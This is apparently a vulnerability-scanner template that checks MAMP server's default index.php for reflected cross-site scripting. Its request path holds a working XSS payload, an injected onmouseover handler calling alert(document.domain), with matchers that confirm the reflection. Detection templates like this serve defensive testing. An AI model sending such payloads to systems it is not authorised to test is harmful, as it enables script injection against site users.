id: mamp-server-xss
name: MAMP Server - Cross-Site Scripting
severity: medium
confidence: confirmed
description: A Cross-Site Scripting (XSS) vulnerability exists in the default installation of MAMP server. The file `/Applications/MAMP/htdocs/index.php`
  is susceptible to malicious input, allowing attackers to inject JavaScript code that executes in the context of the victim's
  browser. This vulnerability can be exploited without prior authentication.
reference: CWE-79
tags:
- mamp
- server
- xss
- vuln
requests:
- method: GET
  path: /index.php/test"%20onmouseover="alert(document.domain);"%20style="font-size:100000px;background-color:white";
  matchers:
  - type: body
    words:
    - MAMP
    - test" onmouseover="alert(document.domain);" style
  - type: body
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
